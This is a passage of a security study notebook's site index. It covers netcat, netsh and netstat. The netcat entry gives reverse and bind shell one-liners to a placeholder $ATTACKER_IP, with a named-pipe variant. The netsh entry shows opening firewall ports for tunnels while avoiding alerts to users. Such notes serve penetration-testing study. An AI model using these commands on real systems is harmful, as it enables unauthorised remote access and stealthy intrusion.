stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;-l&lt;/code&gt; — listen for incoming connections (rather than make an outgoing connection)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-v&lt;/code&gt; — verbose&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-n&lt;/code&gt; — skip DNS resolution (slightly faster, less noisy on the network)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; — specify the port to &lt;em&gt;listen&lt;/em&gt; to&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-u&lt;/code&gt; — connect using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UDP&quot;&gt;UDP&lt;/a&gt; instead of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-k&lt;/code&gt; — keep listening even after client disconnects&lt;/li&gt;\n&lt;/ul&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;The &lt;code&gt;-c&lt;/code&gt; and &lt;code&gt;-e&lt;/code&gt; flags, which allow netcat to hook other applications, are considered security risks (for obvious reasons!) and are disabled on many systems.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;reverse-shells&quot;&gt;Reverse shells&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#reverse-shells&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Example reverse shell:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Attacker: &lt;code&gt;nc -lvnp $LISTENER_PORT&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;Target: &lt;code&gt;nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;It’s also possible to start the listener on the target and then connect from the attacker system; this is sometimes called a “bind” shell:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Attacker: &lt;code&gt;nc $TARGET_IP $LISTENER_PORT&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;Target: &lt;code&gt;nc -lvnp $LISTENER_PORT -e /bin/bash&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;These are almost, but not quite, mirror images of each other.&lt;/p&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;The &lt;code&gt;-e&lt;/code&gt; flag (and similar &lt;code&gt;-c&lt;/code&gt; flag) is considered a security risk (for obvious reasons!) and is disabled on many systems.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;If the &lt;code&gt;-c&lt;/code&gt; or &lt;code&gt;-e&lt;/code&gt; flags aren’t available (which is normal these days), then named pipes can be used instead:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mkfifo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /tmp/p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -lvnp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $LISTENER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /tmp/p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t/bin/sh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/tmp/p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; 2&gt;&amp;#x26;1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;rm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /tmp/p&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;(Note that it’s also possible to reverse the /bin/sh and netcat portions of things; what important is that the named pipe lets us loop I/O between the two applications. See the discussion of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/msfvenom&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/msfvenom&quot;&gt;msfvenom&lt;/a&gt; payloads for a detailed breakdown of this pattern.)&lt;/p&gt;\n&lt;p&gt;Initial netcat reverse shells (in particular web shells) are non-interactive.&lt;/p&gt;\n&lt;h2 id=&quot;shell-stabilization&quot;&gt;Shell “stabilization”&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#shell-stabilization&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Shell-stabilization&quot; data-block=&quot;&quot; data-embed-alias=&quot;spells/Shell stabilization&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Shell-stabilization&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Shell-stabilization&quot;&gt;Transclude of Shell-stabilization&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;port-scanning&quot;&gt;Port scanning&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#port-scanning&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;With the &lt;code&gt;-z&lt;/code&gt; option, netcat will attempt to connect to all &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; ports on the targets in a sequential fashion (if no ports are specified; otherwise just to the specified port), reporting which are open. It’s like a simple, very slow version of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt;!&lt;/p&gt;\n&lt;p&gt;Use &lt;code&gt;-w&lt;/code&gt; to set the timeout in seconds.&lt;/p&gt;\n&lt;p&gt;Use &lt;code&gt;-u&lt;/code&gt; to try connecting over &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UDP&quot;&gt;UDP&lt;/a&gt; rather than &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt;.&lt;/p&gt;\n&lt;h2 id=&quot;port-forwarding&quot;&gt;Port forwarding&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#port-forwarding&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -lvkp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $LOCAL_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -c&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;nc $REMOTE_IP $REMOTE_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;as-a-telnet-replacement&quot;&gt;As a telnet replacement&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#as-a-telnet-replacement&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;If you just have netcat connect to a service directly, it functions exactly like telnet.&lt;/p&gt;"},"spells/netsh":{"slug":"spells/netsh","filePath":"spells/netsh.md","title":"netsh","links":[],"tags":["Application/netsh","OS/Windows/Firewall"],"content":"Check Windows Firewall state:\nnetsh advfirewall show currentprofile\nSee all Windows Firewall rules for inbound connections:\nnetsh advfirewall firewall show rule dir=in name=all\nBe aware that most built-in rules on Windows are bound to particular applications. But admins are lazy, and seldom bind custom rules to explicit applications. There’s no 100% reliable way to identify custom rules from the command line, but they’ll often have obvious naming conventions.\nSee all Windows Firewall rules for outbound connections:\nnetsh advfirewall firewall show rule dir=out name=all\nPunch a hole in the Windows Firewall for ports 80, 443, and 4444:\nnetsh advfirewall firewall add action=allow name=tunnel_in `\n\tdir=in protocol=tcp localport=&quot;80,443,4444&quot;\nnetsh advfirewall firewall add action=allow name=tunnel_out `\n\tdir=out protocol=tcp localport=&quot;80,443,4444&quot;\nIn general you don’t want to turn off the Windows Firewall, as doing so will generate a popup for any users currently logged into the machine.","richContent":"&lt;p&gt;Check Windows Firewall state:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;netsh advfirewall show currentprofile&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;See all Windows Firewall rules for inbound connections:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;netsh advfirewall firewall show rule dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; name&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;all&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Be aware that most built-in rules on Windows are bound to particular applications. But admins are lazy, and seldom bind custom rules to explicit applications. There’s no 100% reliable way to identify custom rules from the command line, but they’ll often have obvious naming conventions.&lt;/p&gt;\n&lt;p&gt;See all Windows Firewall rules for outbound connections:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;netsh advfirewall firewall show rule dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;out name&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;all&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Punch a hole in the Windows Firewall for ports 80, 443, and 4444:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;netsh advfirewall firewall add action&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;allow name&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;tunnel_in &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tdir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; protocol&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;tcp localport&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;80,443,4444&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;netsh advfirewall firewall add action&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;allow name&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;tunnel_out &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tdir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;out protocol&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;tcp localport&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;80,443,4444&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;In general you don’t want to turn off the Windows Firewall, as doing so will generate a popup for any users currently logged into the machine.&lt;/p&gt;"},"spells/netstat":{"slug":"spells/netstat","filePath":"spells/netstat.md","title":"netstat","links":["spells/TCP","spells/UDP","spells/findstr"],"tags":["Application/netstat","OS/Linux","OS/Windows","Application/findstr","AttackCycle/Reconnaissance"],"content":"The netstat command is found on both Linux and Windows, though the two versions have slightly different options.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nLinuxWindowsDescription-a-aShows all sockets (listening and established)-iShows per interface statistics-lShow only listening ports-n-nDo not resolve IP addresses or port numbers-p-obShow PID and binary using the socket (needs root)-sShow protocol statistics-t-p TCPShow TCP sockets only-u-p UDPShow UDP sockets only-xShow UNIX sockets (kernel-only “network”) only\nOn Windows, if you know the PID of a process, you can use netstat + findstr to quickly find out what ports its listening on:\nnetstat -noa | findstr &quot;LISTENING&quot; | findstr &quot;$PID&quot;","richContent":"&lt;p&gt;The netstat command is found on both Linux and Windows, though the two versions have slightly different options.&lt;/p&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th align=&quot;right&quot;&gt;Linux&lt;/th&gt;&lt;th align=&quot;right&quot;&gt;Windows&lt;/th&gt;&lt;th align=&quot;left&quot;&gt;Description&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-a&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-a&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Shows all sockets (listening and established)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-i&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Shows per interface statistics&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-l&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Show &lt;em&gt;only&lt;/em&gt; listening ports&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-n&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-n&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Do &lt;em&gt;not&lt;/em&gt; resolve IP addresses or port numbers&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-p&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-ob&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Show PID and binary using the socket (needs root)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-s&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Show protocol statistics&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-t&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-p TCP&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Show &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; sockets only&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-u&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-p UDP&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Show &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UDP&quot;&gt;UDP&lt;/a&gt; sockets only&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;code&gt;-x&lt;/code&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Show UNIX sockets (kernel-only “network”) only&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n&lt;p&gt;On Windows, if you know the PID of a process, you can use netstat + &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/findstr&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/findstr&quot;&gt;findstr&lt;/a&gt; to quickly find out what ports its listening on:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;netstat &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;noa &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; findstr &lt;/span&gt;&lt;span 